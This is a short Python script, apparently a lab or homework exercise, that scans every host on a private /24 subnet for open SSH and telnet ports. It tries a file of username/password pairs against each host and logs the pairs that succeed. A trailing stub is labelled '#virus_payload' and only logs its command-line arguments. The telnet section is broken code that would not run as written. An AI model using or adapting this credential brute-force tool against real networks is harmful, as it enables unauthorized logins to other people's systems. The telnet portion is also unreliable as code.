import paramiko, socket, telnetlib, time
def ssh_open():
    result = []
    username_list = []
    password_list = []
    with open('Q2pwd','r') as readfile:
        result = readfile.readlines()
        lines = [line.strip() for line in result]
        username_list = [line.split(" ")[0] for line in lines]
        password_list = [line.split(" ")[1] for line in lines]

    
    host = '172.16.48'
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open("Q2_stuff", "w") as f:
        for i in range(256):
            print(f'{i}/256', end = '\r')
            for j in range(len(username_list)):
                temp = ''.join((host,'.',str(i)))
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                a_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                a_socket.settimeout(1)
                result_for_ssh = a_socket.connect_ex((temp,22))

                if result_for_ssh == 0:
                    try: ssh.connect(hostname=temp,username=username_list[j],password=password_list[j])

                    except Exception as e:
                        print(e)
                    else:
                        print("ssh {} {}".format(username_list[j],password_list[j]))
                        f.write("ssh {} {}".format(username_list[j],password_list[j]))
                a_socket.close()
                a_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                a_socket.settimeout(1)
                result_for_telnet = a_socket.connect_ex((temp,23))
                if result_for_telnet == 0:
                    try:
                        telnetlib.Telnet(temp)
                        telnetlib.Telnet.read_until(b"User Name:")
                        telnetlib.Telnet.write(b"{}\n".format(username_list[j]))
                        telnetlib.Telnet.read_until(b"Password:")
                        telnetlib.Telnet.write(b"{}\n".format(password_list[j]))
                
                    except Exception as e:
                        print(e)
            
                    else:
                        print("telnet {} {}".format(username_list[j],password_list[j]))
                        f.write("telnet {} {}".format(username_list[j],password_list[j]))
                a_socket.close()

start = time.time()
ssh_open()
end = time.time()

print(end - start)


#virus_payload
import sys
import os
                
with open('Q1C.out', 'a') as f:
    f.write(' '.join(sys.argv) + '\n')


